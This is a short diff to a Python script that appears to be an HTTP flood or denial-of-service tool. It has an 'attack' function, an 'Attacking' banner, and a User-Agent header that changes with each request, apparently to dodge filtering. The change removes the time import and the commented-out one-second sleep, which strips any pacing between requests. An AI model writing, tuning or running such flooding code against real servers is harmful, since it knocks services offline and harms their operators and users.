@@ -29,7 +29,6 @@
 import resource
 import sys
 import gc
-import time
 import urllib.request
 from urllib.request import Request
 
@@ -63,8 +62,7 @@ print('\n____________________________________________________\n\n', 'Attacking -
 def attack(counter, counterForUAGeneration):
 
 	gc.collect()
-	#time.sleep(1)
-
+	
 	counter += 1
 	counterForUAGeneration = (counterForUAGeneration + 1) if counterForUAGeneration < 1000 else (counterForUAGeneration - 1000)
 	headers = {'User-Agent': UAStr + str(counterForUAGeneration)}
